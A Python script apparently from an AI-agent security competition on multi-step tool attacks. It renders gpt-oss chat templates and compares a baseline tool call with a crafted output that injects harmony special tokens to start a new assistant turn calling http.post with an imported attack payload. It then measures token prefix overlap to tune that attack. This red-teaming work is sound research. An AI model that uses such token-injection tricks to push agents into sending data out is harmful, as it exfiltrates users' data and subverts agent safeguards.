#!/usr/bin/env python3
from __future__ import annotations

import json
import sys
from pathlib import Path

from llama_cpp import Llama
from llama_cpp.llama_chat_format import Jinja2ChatFormatter


SDK_ROOT = Path("ai-agent-security-multi-step-tool-attacks")
sys.path.insert(0, str(SDK_ROOT))
sys.path.insert(0, ".")

import attack  # noqa: E402
from aicomp_sdk.agents.gpt_oss_agent import (  # noqa: E402
    _parse_gpt_oss_harmony_response,
)


MODEL = (
    "model/gpt-oss-20b-gguf-pytorch-default-v1/gpt_oss/"
    "gpt-oss-20b-Q4_K_M.gguf"
)


def lcp(left: list[int], right: list[int]) -> int:
    size = 0
    for a, b in zip(left, right):
        if a != b:
            break
        size += 1
    return size


def main() -> None:
    llm = Llama(model_path=MODEL, vocab_only=True, verbose=False)
    eos_id = llm.token_eos()
    bos_id = llm.token_bos()
    formatter = Jinja2ChatFormatter(
        template=llm.metadata["tokenizer.chat_template"],
        eos_token=llm._model.token_get_text(eos_id),
        bos_token=llm._model.token_get_text(bos_id),
        stop_token_ids=[eos_id],
    )

    user = attack._template_msg(0, attack.GPT_HARMONY_EMPTY_TEMPLATE)
    arguments = {"data": attack.PAYLOAD, "url": "http://aa"}
    args_json = json.dumps(arguments, separators=(",", ":"))
    baseline_raw = (
        "<|channel|>commentary to=functions.http.post<|message|>" + args_json
    )
    aligned_raw = (
        "<|channel|>final<|message|>x<|end|>"
        "<|start|>assistant to=functions.http.post"
        "<|channel|>commentary json to=functions.http.post<|message|>"
        + args_json
    )

    def render(messages: list[dict[str, object]]) -> list[int]:
        prompt = formatter(messages=messages, tools=[]).prompt
        return llm.tokenize(prompt.encode("utf-8"), add_bos=False, special=True)

    a_ids = render([
        {"role": "system", "content": "You are a tool-using agent."},
        {"role": "user", "content": user},
    ])

    rows = []
    for name, raw in (("baseline", baseline_raw), ("assistant_plus_tool", aligned_raw)):
        parsed = _parse_gpt_oss_harmony_response(raw)
        assert parsed is not None
        content = parsed.get("content") or ""
        call = parsed["tool_calls"][0]
        messages: list[dict[str, object]] = [
            {"role": "system", "content": "You are a tool-using agent."},
            {"role": "user", "content": user},
        ]
        if content:
            messages.append({"role": "assistant", "content": content})
        messages.extend([
            {
                "role": "assistant",
                "tool_calls": [
                    {
                        "type": "function",
                        "id": "call_000000",
                        "function": {
                            "name": call["function"]["name"],
                            "arguments": json.dumps(call["function"]["arguments"]),
                        },
                    }
                ],
            },
            {"role": "tool", "tool_call_id": "call_000000", "content": "ok"},
        ])
        b_ids = render(messages)
        raw_ids = llm.tokenize(raw.encode("utf-8"), add_bos=False, special=True)
        cached = a_ids + raw_ids
        common = lcp(cached, b_ids)
        rows.append({
            "name": name,
            "output_tokens": len(raw_ids),
            "prompt_a_tokens": len(a_ids),
            "prompt_b_tokens": len(b_ids),
            "lcp_tokens": common,
            "posttool_suffix_tokens": len(b_ids) - common,
            "proxy_output_plus_suffix": len(raw_ids) + len(b_ids) - common,
            "parsed_content": content,
        })
    print(json.dumps(rows, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
